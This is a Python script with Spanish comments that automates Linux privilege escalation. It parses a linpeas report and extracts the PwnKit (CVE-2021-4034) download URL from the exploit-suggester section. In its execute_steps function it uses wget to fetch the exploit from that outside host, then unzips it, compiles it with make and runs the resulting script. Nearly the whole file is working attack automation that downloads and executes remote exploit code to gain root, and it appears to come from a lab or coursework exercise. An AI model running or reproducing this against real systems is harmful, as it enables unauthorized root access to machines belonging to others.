import subprocess
import re
import os

def execute_steps(url):
	subprocess.call(["wget", url])
	subprocess.call(["unzip", "main"])
	os.chdir("CVE-2021-4034-main")
	subprocess.call(["make"])
	subprocess.call(["chmod", "+x", "cve-2021-4034.sh"])
	subprocess.call(["./cve-2021-4034.sh"])

def extract_data():
	input_file = '317274282_linpeas.txt'
	
	with open(input_file, 'r') as f:
		lines = f.readlines()
		
	extracted_data=[]
	found_start = False
	found_start2 = False
	found_pwnkit = False
	found_url = False
	url = None
	
	for line in lines:
		#Localiza la seccion de "Executing Linux Exploit Suggester"
		if "Executing Linux Exploit Suggester" in line:
			found_start = True
		#Cuando localiza la seccion, la coloca en el arreglo de "extracted_data"
		if found_start:
			extracted_data.append(line)
		#Se coloca en True la bandera de found_start2, lo que indica que es el final de la seccion "Executing Linux Exploit Suggester".
		if "Executing Linux Exploit Suggester 2" in line:
			found_start2 = True
		#Se coloca en True la bandera de Pwnkit, esto para que pueda buscar la URL del CVE a partir de que encuentr la vulnerabilidad
		if "PwnKit" in line:
			found_pwnkit = True
			
		if found_pwnkit and "Download URL:" in line:
			found_url = True
		
		if found_url and not url:
			match = re.search("(?P<url>https?://[^\s]+)", line)
			if match:
				url = match.group("url")
				
		#Se detiene la extraccion de datos cuando se ha llegado al termino de la seccion "Executing Linux Exploit Suggester", es decir, cuando inicia "Executing Linux Exploit Suggester 2"
		if found_start2 and not line.strip():
			break	
		
	#Copia en el archivo los CVE extraidos de la seccion "Executing Linux Exploit Suggester"
	with open('datos_extraidos.txt', 'w') as f:
		for line in extracted_data:
			f.write(line)			
	
	#Para una mejor visualizacion, se imprimen todas las vulnerabilidades que se encontraron, se imprime el CVE y el nombre		
	with open('datos_extraidos.txt', 'r') as f:
		print("Vulnerabilidades encontradas en la seccion Executing Linux Exploit Suggester\n") 
		for line in f:
			if line.startswith("[+]") and line.endswith("\n"):
				print(line.strip())
		print("\nVulnerabilidad explotada: CVE-2021-4034")
		
	#Si el codigo encuentra e archivo de descarga de CVE-2021-4034, entonces lo imprime y lo pasa a la funcion que ejecuta la vulnerabilidad
	if url:
		print("URL: {}".format(url))
		execute_steps(url) 
	else:
		print("No URL found")
	
			
extract_data()
	
